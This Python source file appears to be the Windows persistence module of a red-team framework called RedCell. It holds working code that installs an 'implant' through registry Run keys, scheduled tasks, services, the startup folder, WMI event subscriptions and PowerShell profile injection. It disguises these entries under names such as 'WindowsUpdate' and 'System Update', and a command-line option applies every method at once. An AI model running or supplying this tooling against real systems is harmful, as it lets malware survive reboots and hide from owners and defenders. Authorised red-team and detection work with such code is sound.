"""
Windows Persistence Module

Implements various persistence techniques for Windows systems.
"""

import os
import subprocess
import base64
from typing import Optional, Dict, List
import tempfile


class WindowsPersistence:
    """
    Windows persistence mechanisms.

    Techniques:
    - Registry Run keys
    - Scheduled tasks
    - Services
    - Startup folder
    - WMI event subscriptions
    - DLL hijacking preparation
    """

    # Common registry persistence locations
    REGISTRY_LOCATIONS = {
        'HKCU_Run': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKCU_RunOnce': r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM_Run': r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM_RunOnce': r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU_Explorer_Run': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
        'HKLM_Explorer_Run': r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
    }

    def __init__(self, implant_path: Optional[str] = None, name: str = 'WindowsUpdate'):
        """
        Initialize Windows persistence.

        Args:
            implant_path: Path to implant executable/script
            name: Name for persistence mechanism
        """
        self.implant_path = implant_path
        self.name = name
        self.persistence_methods = []

    def registry_run_key(
        self,
        location: str = 'HKCU_Run',
        value_name: Optional[str] = None
    ) -> bool:
        """
        Create registry Run key persistence.

        Args:
            location: Registry location key (from REGISTRY_LOCATIONS)
            value_name: Registry value name (uses self.name if None)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        value_name = value_name or self.name
        reg_path = self.REGISTRY_LOCATIONS.get(location)

        if not reg_path:
            print(f"[-] Invalid registry location: {location}")
            return False

        try:
            # Use reg add command
            cmd = [
                'reg', 'add', reg_path,
                '/v', value_name,
                '/t', 'REG_SZ',
                '/d', self.implant_path,
                '/f'
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                print(f"[+] Registry persistence created: {reg_path}\\{value_name}")
                self.persistence_methods.append({
                    'type': 'registry',
                    'location': reg_path,
                    'value': value_name
                })
                return True
            else:
                print(f"[-] Failed to create registry key: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Error creating registry persistence: {e}")
            return False

    def scheduled_task(
        self,
        task_name: Optional[str] = None,
        trigger: str = 'ONLOGON',
        run_level: str = 'HIGHEST'
    ) -> bool:
        """
        Create scheduled task persistence.

        Args:
            task_name: Task name (uses self.name if None)
            trigger: Task trigger (ONLOGON, ONIDLE, DAILY, etc.)
            run_level: Run level (HIGHEST or LIMITED)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        task_name = task_name or self.name

        try:
            # Create scheduled task using schtasks
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', self.implant_path,
                '/sc', trigger,
                '/rl', run_level,
                '/f'
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                print(f"[+] Scheduled task created: {task_name}")
                self.persistence_methods.append({
                    'type': 'scheduled_task',
                    'name': task_name,
                    'trigger': trigger
                })
                return True
            else:
                print(f"[-] Failed to create scheduled task: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Error creating scheduled task: {e}")
            return False

    def service_persistence(
        self,
        service_name: Optional[str] = None,
        display_name: Optional[str] = None,
        start_type: str = 'auto'
    ) -> bool:
        """
        Create Windows service persistence.

        Args:
            service_name: Service name (uses self.name if None)
            display_name: Display name for service
            start_type: Service start type (auto, demand, disabled)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        service_name = service_name or self.name
        display_name = display_name or service_name

        try:
            # Create service using sc command
            cmd = [
                'sc', 'create', service_name,
                'binPath=', self.implant_path,
                'DisplayName=', display_name,
                'start=', start_type
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                print(f"[+] Service created: {service_name}")

                # Try to start the service
                start_cmd = ['sc', 'start', service_name]
                subprocess.run(start_cmd, capture_output=True, timeout=10)

                self.persistence_methods.append({
                    'type': 'service',
                    'name': service_name
                })
                return True
            else:
                print(f"[-] Failed to create service: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Error creating service: {e}")
            return False

    def startup_folder(self, all_users: bool = False) -> bool:
        """
        Copy implant to startup folder.

        Args:
            all_users: Use all users startup folder (requires admin)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        try:
            if all_users:
                startup_path = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
            else:
                startup_path = os.path.join(
                    os.environ['APPDATA'],
                    r'Microsoft\Windows\Start Menu\Programs\Startup'
                )

            # Get implant filename
            implant_filename = os.path.basename(self.implant_path)
            dest_path = os.path.join(startup_path, implant_filename)

            # Copy file
            import shutil
            shutil.copy2(self.implant_path, dest_path)

            print(f"[+] Implant copied to startup folder: {dest_path}")
            self.persistence_methods.append({
                'type': 'startup_folder',
                'path': dest_path
            })
            return True

        except Exception as e:
            print(f"[-] Error copying to startup folder: {e}")
            return False

    def wmi_event_subscription(
        self,
        event_filter_name: Optional[str] = None,
        trigger_query: str = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    ) -> bool:
        """
        Create WMI event subscription persistence.

        Args:
            event_filter_name: Event filter name
            trigger_query: WMI query for trigger

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        event_filter_name = event_filter_name or f"{self.name}Filter"
        consumer_name = f"{self.name}Consumer"
        binding_name = f"{self.name}Binding"

        try:
            # Create event filter
            filter_cmd = f"""
            $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
                Name = '{event_filter_name}'
                EventNamespace = 'root\\cimv2'
                QueryLanguage = 'WQL'
                Query = "{trigger_query}"
            }}
            """

            # Create command line consumer
            consumer_cmd = f"""
            $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
                Name = '{consumer_name}'
                CommandLineTemplate = '{self.implant_path}'
            }}
            """

            # Bind filter to consumer
            binding_cmd = f"""
            Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
                Filter = $Filter
                Consumer = $Consumer
            }}
            """

            # Execute PowerShell commands
            full_cmd = filter_cmd + consumer_cmd + binding_cmd

            result = subprocess.run(
                ['powershell', '-Command', full_cmd],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                print(f"[+] WMI event subscription created: {event_filter_name}")
                self.persistence_methods.append({
                    'type': 'wmi_subscription',
                    'filter': event_filter_name,
                    'consumer': consumer_name
                })
                return True
            else:
                print(f"[-] Failed to create WMI subscription: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Error creating WMI subscription: {e}")
            return False

    def create_lnk_file(
        self,
        target_path: str,
        lnk_path: str,
        arguments: str = "",
        description: str = "Windows Update"
    ) -> bool:
        """
        Create a .lnk shortcut file.

        Args:
            target_path: Path to target executable
            lnk_path: Path for .lnk file
            arguments: Command line arguments
            description: Shortcut description

        Returns:
            True if successful
        """
        try:
            # PowerShell script to create shortcut
            ps_script = f"""
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut('{lnk_path}')
            $Shortcut.TargetPath = '{target_path}'
            $Shortcut.Arguments = '{arguments}'
            $Shortcut.Description = '{description}'
            $Shortcut.Save()
            """

            result = subprocess.run(
                ['powershell', '-Command', ps_script],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                print(f"[+] LNK file created: {lnk_path}")
                return True
            else:
                print(f"[-] Failed to create LNK: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Error creating LNK file: {e}")
            return False

    def powershell_profile_persistence(self, payload: str) -> bool:
        """
        Add persistence to PowerShell profile.

        Args:
            payload: PowerShell code to add to profile

        Returns:
            True if successful
        """
        try:
            # Get PowerShell profile path
            ps_cmd = '$PROFILE.AllUsersAllHosts'
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode != 0:
                # Try current user profile
                ps_cmd = '$PROFILE.CurrentUserAllHosts'
                result = subprocess.run(
                    ['powershell', '-Command', ps_cmd],
                    capture_output=True,
                    text=True,
                    timeout=10
                )

            profile_path = result.stdout.strip()

            if not profile_path:
                print("[-] Could not determine PowerShell profile path")
                return False

            # Ensure profile directory exists
            profile_dir = os.path.dirname(profile_path)
            os.makedirs(profile_dir, exist_ok=True)

            # Append payload to profile
            with open(profile_path, 'a') as f:
                f.write(f"\n# System Update\n{payload}\n")

            print(f"[+] PowerShell profile persistence added: {profile_path}")
            self.persistence_methods.append({
                'type': 'powershell_profile',
                'path': profile_path
            })
            return True

        except Exception as e:
            print(f"[-] Error adding PowerShell profile persistence: {e}")
            return False

    def cleanup_persistence(self, method_index: Optional[int] = None) -> bool:
        """
        Remove persistence mechanisms.

        Args:
            method_index: Index of specific method to remove (None for all)

        Returns:
            True if successful
        """
        methods_to_remove = [self.persistence_methods[method_index]] if method_index is not None else self.persistence_methods

        success = True
        for method in methods_to_remove:
            try:
                if method['type'] == 'registry':
                    cmd = ['reg', 'delete', method['location'], '/v', method['value'], '/f']
                    subprocess.run(cmd, capture_output=True, timeout=10)
                    print(f"[+] Removed registry key: {method['location']}\\{method['value']}")

                elif method['type'] == 'scheduled_task':
                    cmd = ['schtasks', '/delete', '/tn', method['name'], '/f']
                    subprocess.run(cmd, capture_output=True, timeout=10)
                    print(f"[+] Removed scheduled task: {method['name']}")

                elif method['type'] == 'service':
                    subprocess.run(['sc', 'stop', method['name']], capture_output=True, timeout=10)
                    subprocess.run(['sc', 'delete', method['name']], capture_output=True, timeout=10)
                    print(f"[+] Removed service: {method['name']}")

                elif method['type'] == 'startup_folder':
                    if os.path.exists(method['path']):
                        os.remove(method['path'])
                    print(f"[+] Removed startup file: {method['path']}")

            except Exception as e:
                print(f"[-] Error removing {method['type']}: {e}")
                success = False

        if method_index is None:
            self.persistence_methods = []
        else:
            del self.persistence_methods[method_index]

        return success

    def list_persistence(self) -> List[Dict]:
        """
        List all active persistence mechanisms.

        Returns:
            List of persistence method dictionaries
        """
        return self.persistence_methods

    def generate_report(self) -> str:
        """
        Generate persistence report.

        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 60)
        report.append("WINDOWS PERSISTENCE REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal persistence mechanisms: {len(self.persistence_methods)}\n")

        for i, method in enumerate(self.persistence_methods, 1):
            report.append(f"[{i}] {method['type'].upper()}")

            for key, value in method.items():
                if key != 'type':
                    report.append(f"    {key}: {value}")

            report.append("")

        report.append("=" * 60)
        return "\n".join(report)


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Windows Persistence')
    parser.add_argument('implant', help='Path to implant executable/script')
    parser.add_argument('--name', default='WindowsUpdate', help='Persistence name')
    parser.add_argument('--registry', action='store_true', help='Use registry persistence')
    parser.add_argument('--task', action='store_true', help='Use scheduled task')
    parser.add_argument('--service', action='store_true', help='Use service persistence')
    parser.add_argument('--startup', action='store_true', help='Use startup folder')
    parser.add_argument('--wmi', action='store_true', help='Use WMI subscription')
    parser.add_argument('--all', action='store_true', help='Use all methods')
    parser.add_argument('--cleanup', action='store_true', help='Remove persistence')

    args = parser.parse_args()

    persist = WindowsPersistence(args.implant, args.name)

    if args.cleanup:
        persist.cleanup_persistence()
        return

    if args.all or args.registry:
        persist.registry_run_key()

    if args.all or args.task:
        persist.scheduled_task()

    if args.all or args.service:
        persist.service_persistence()

    if args.all or args.startup:
        persist.startup_folder()

    if args.all or args.wmi:
        persist.wmi_event_subscription()

    print("\n" + persist.generate_report())


if __name__ == '__main__':
    main()
